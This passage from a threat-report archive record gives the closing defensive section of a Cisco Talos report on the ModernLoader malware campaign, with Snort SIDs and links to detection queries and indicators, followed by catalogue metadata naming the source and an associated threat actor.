binaries and builds protection into all Cisco Secure products.](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\n\n[Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether](https://umbrella.cisco.com/)\n[users are on or off the corporate network. Sign up for a free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial)\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\nsuspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are available from the Firewall Management\nCenter.\n\n[Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.](https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial)\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for\n[purchase on Snort.org.](https://www.snort.org/products)\n\nThe following Snort SIDs are applicable to this threat: 60437-60440\n\n**Orbital Queries**\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected](https://orbital.amp.cisco.com/help/)\n[with this specific threat. For specific OSqueries on this threat, click here.](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_modernloader_registry_persistence.yaml)\n\n## Indicators of Compromise\n\n[Indicators of Compromise associated with this threat can be found here.](https://raw.githubusercontent.com/Cisco-Talos/IOCs/main/2022/08/modernloader-delivers-multiple-stealers.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-30 - ModernLoader delivers multiple stealers, cryptominers and RATs.pdf"
    ],
    "report_names": [
        "2022-08-30 - ModernLoader delivers multiple stealers, cryptominers and RATs.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536116,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1662028328,
    "ts_modification_date": 1662028328,
    "files": {
        "pdf": "https://archive.orkl.eu/c1b85f82979c4836645ac51a1e1fd4845c25871c.pdf",
        "text": "https://archive.orkl.eu/c1b85f82979c4836645ac51a1e1fd4845c25871c.txt",
        "img": "https://archive.orkl.eu/c1b85f82979c4836645ac51a1e1fd4845c25871c.jpg"
    }
}